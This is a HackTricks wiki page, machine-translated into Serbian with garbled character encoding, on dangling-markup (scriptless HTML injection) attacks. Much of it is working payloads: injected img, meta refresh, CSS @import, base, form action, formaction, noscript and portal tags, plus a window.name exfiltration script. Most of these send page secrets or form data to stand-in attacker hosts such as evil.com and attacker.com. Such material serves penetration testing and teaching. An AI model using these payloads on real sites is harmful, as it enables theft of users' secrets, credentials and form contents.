# Dangling Markup - HTML scriptless injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Resume

Ova tehnika se moÅ¾e koristiti za ekstrakciju informacija od korisnika kada se **HTML injekcija pronaÄ‘e**. Ovo je veoma korisno ako **ne pronaÄ‘ete naÄin da iskoristite** [**XSS** ](../xss-cross-site-scripting/) ali moÅ¾ete **injektovati neke HTML tagove**.\
TakoÄ‘e je korisno ako je neka **tajna saÄuvana u Äistom tekstu** u HTML-u i Å¾elite da je **izvuÄete** od klijenta, ili ako Å¾elite da obmanete neku izvrÅ¡avanje skripte.

Nekoliko tehnika komentisanih ovde moÅ¾e se koristiti za zaobilaÅ¾enje nekih [**Content Security Policy**](../content-security-policy-csp-bypass/) eksfiltracijom informacija na neoÄekivane naÄine (html tagovi, CSS, http-meta tagovi, forme, base...).

## Main Applications

### Stealing clear text secrets

Ako injektujete `<img src='http://evil.com/log.cgi?` kada se stranica uÄita, Å¾rtva Ä‡e vam poslati sav kod izmeÄ‘u injektovanog `img` taga i sledeÄ‡e navodnike unutar koda. Ako se neka tajna nekako nalazi u tom delu, ukrasti Ä‡ete je (moÅ¾ete uraditi istu stvar koristeÄ‡i dvostruke navodnike, pogledajte Å¡ta bi moglo biti zanimljivije za koriÅ¡Ä‡enje).

Ako je `img` tag zabranjen (zbog CSP-a na primer) moÅ¾ete takoÄ‘e koristiti `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Napomena da **Chrome blokira HTTP URL-ove** sa "<" ili "\n" u njima, pa moÅ¾ete probati druge protokole kao Å¡to je "ftp".

TakoÄ‘e moÅ¾ete zloupotrebiti CSS `@import` (Ä‡e poslati sav kod dok ne pronaÄ‘e ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
MoÅ¾ete takoÄ‘e koristiti **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
MoÅ¾ete takoÄ‘e umetnuti `<base` tag. Sve informacije Ä‡e biti poslate dok se citat ne zatvori, ali zahteva neku interakciju korisnika (korisnik mora da klikne na neki link, jer Ä‡e `<base` tag promeniti domen na koji link upuÄ‡uje):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### KraÄ‘a obrazaca
```html
<base href='http://evil.com/'>
```
Zatim, forme koje Å¡alju podatke na putanju (kao Å¡to je `<form action='update_profile.php'>`) Ä‡e slati podatke na zloÄ‡udnu domenu.

### Stealing forms 2

Postavite zaglavlje forme: `<form action='http://evil.com/log_steal'>` ovo Ä‡e prepisati sledeÄ‡e zaglavlje forme i svi podaci iz forme Ä‡e biti poslati napadaÄu.

### Stealing forms 3

Dugme moÅ¾e promeniti URL na koji Ä‡e informacije iz forme biti poslate sa atributom "formaction":
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
NapadaÄ moÅ¾e koristiti ovo da ukrade informacije.

PronaÄ‘ite [**primer ovog napada u ovom izveÅ¡taju**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### KraÄ‘a tajni u Äistom tekstu 2

KoristeÄ‡i najnoviju pomenutu tehniku za kraÄ‘u formi (ubacivanje novog zaglavlja forme) moÅ¾ete zatim ubaciti novo polje za unos:
```html
<input type='hidden' name='review_body' value="
```
i ovo polje za unos Ä‡e sadrÅ¾ati sav sadrÅ¾aj izmeÄ‘u njegovih dvostrukih navodnika i sledeÄ‡ih dvostrukih navodnika u HTML-u. Ovaj napad kombinuje "_**KraÄ‘u tajnih podataka u Äistom tekstu**_" sa "_**KraÄ‘om formi2**_".

MoÅ¾ete uÄiniti istu stvar injektovanjem forme i `<option>` taga. Svi podaci do zatvorenog `</option>` Ä‡e biti poslati:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Injekcija parametara forme

MoÅ¾ete promeniti putanju forme i uneti nove vrednosti tako da Ä‡e se izvrÅ¡iti neoÄekivana radnja:
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### KraÄ‘a tajni u Äistom tekstu putem noscript

`<noscript></noscript>` Je oznaka Äiji Ä‡e sadrÅ¾aj biti interpretiran ako pregledaÄ ne podrÅ¾ava javascript (moÅ¾ete omoguÄ‡iti/iskljuÄiti Javascript u Chrome-u na [chrome://settings/content/javascript](chrome://settings/content/javascript)).

NaÄin za eksfiltraciju sadrÅ¾aja web stranice od taÄke injekcije do dna na sajt koji kontroliÅ¡e napadaÄ biÄ‡e injektovanje ovoga:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypassing CSP with user interaction

Iz ovog [portswiggers istraÅ¾ivanja](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) moÅ¾ete saznati da Äak i iz **najviÅ¡e CSP ograniÄenih** okruÅ¾enja moÅ¾ete joÅ¡ uvek **izvuÄ‡i podatke** uz malo **interakcije korisnika**. U ovoj prilici Ä‡emo koristiti payload:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Napomena da Ä‡ete traÅ¾iti od **Å¾rtve** da **klikne na link** koji Ä‡e ga **preusmeriti** na **payload** koji kontroliÅ¡ete. TakoÄ‘e, napomenite da Ä‡e **`target`** atribut unutar **`base`** taga sadrÅ¾ati **HTML sadrÅ¾aj** do sledeÄ‡e jednostruke navodnike.\
To Ä‡e uÄiniti da Ä‡e **vrednost** **`window.name`** ako se link klikne biti sav taj **HTML sadrÅ¾aj**. Stoga, poÅ¡to **kontroliÅ¡ete stranicu** na kojoj Å¾rtva pristupa klikom na link, moÅ¾ete pristupiti tom **`window.name`** i **ekfiltrirati** te podatke:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### ZavaravajuÄ‡i tok skripte 1 - HTML namespace napad

Umetnite novu oznaku sa id-jem unutar HTML-a koja Ä‡e prepisati sledeÄ‡u i sa vrednoÅ¡Ä‡u koja Ä‡e uticati na tok skripte. U ovom primeru birate sa kim Ä‡e se informacija deliti:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### ZavaravajuÄ‡i tok skripte 2 - Napad na prostor imena skripte

Kreirajte promenljive unutar javascript prostora imena umetajuÄ‡i HTML tagove. Tada Ä‡e ova promenljiva uticati na tok aplikacije:
```html
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```
### Zloupotreba JSONP-a

Ako pronaÄ‘ete JSONP interfejs, mogli biste biti u moguÄ‡nosti da pozovete proizvoljnu funkciju sa proizvoljnim podacima:
```html
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```
Ili moÅ¾ete Äak pokuÅ¡ati da izvrÅ¡ite neki javascript:
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### Iframe zloupotreba

DeÄiji dokument ima moguÄ‡nost da pregleda i menja `location` svojstvo svog roditelja, Äak i u situacijama sa razliÄitim poreklima. To omoguÄ‡ava umetanje skripte unutar **iframe** koja moÅ¾e preusmeriti klijenta na proizvoljnu stranicu:
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Ovo se moÅ¾e ublaÅ¾iti neÄim poput: `sandbox=' allow-scripts allow-top-navigation'`

Iframe se takoÄ‘e moÅ¾e zloupotrebiti da bi se otkrile osetljive informacije sa druge stranice **koristeÄ‡i atribut imena iframe-a**. To je zato Å¡to moÅ¾ete kreirati iframe koji se sam iframe-uje zloupotrebljavajuÄ‡i HTML injekciju koja Äini da **osetljive informacije izgledaju unutar atributa imena iframe-a** i zatim pristupiti tom imenu iz inicijalnog iframe-a i otkriti ga.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
For more info check [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abuse

MoÅ¾ete koristiti **`meta http-equiv`** za izvoÄ‘enje **several actions** kao Å¡to je postavljanje kolaÄiÄ‡a: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ili izvoÄ‘enje preusmeravanja (u 5s u ovom sluÄaju): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Ovo se moÅ¾e **avoided** sa **CSP** u vezi sa **http-equiv** ( `Content-Security-Policy: default-src 'self';`, ili `Content-Security-Policy: http-equiv 'self';`)

### New \<portal HTML tag

MoÅ¾ete pronaÄ‡i veoma **interesting research** o iskoristivim ranjivostima \<portal taga [here](https://research.securitum.com/security-analysis-of-portal-element/).\
U trenutku pisanja ovog teksta potrebno je omoguÄ‡iti portal tag na Chrome-u u `chrome://flags/#enable-portals` ili neÄ‡e raditi.
```html
<portal src='https://attacker-server?
```
### HTML Leaks

Nisu svi naÄini za curenje povezanosti u HTML-u korisni za Dangling Markup, ali ponekad mogu pomoÄ‡i. Proverite ih ovde: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

Ovo je **meÅ¡avina** izmeÄ‘u **dangling markup i XS-Leaks**. S jedne strane, ranjivost omoguÄ‡ava **injekciju HTML-a** (ali ne JS) na stranicu **iste domene** kao ona koju Ä‡emo napadati. S druge strane, neÄ‡emo **napadati** direktno stranicu na kojoj moÅ¾emo injektovati HTML, veÄ‡ **druguu stranicu**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search su orijentisane na **ekstrakciju informacija iz razliÄitih domena** zloupotrebom **napada putem sporednih kanala**. Stoga, to je drugaÄija tehnika od Dangling Markup, meÄ‘utim, neke od tehnika zloupotrebljavaju ukljuÄivanje HTML tagova (sa i bez izvrÅ¡avanja JS), kao Å¡to su [**CSS Injection**](../xs-search/#css-injection) ili [**Lazy Load Images**](../xs-search/#image-lazy-loading)**.**

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## References

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
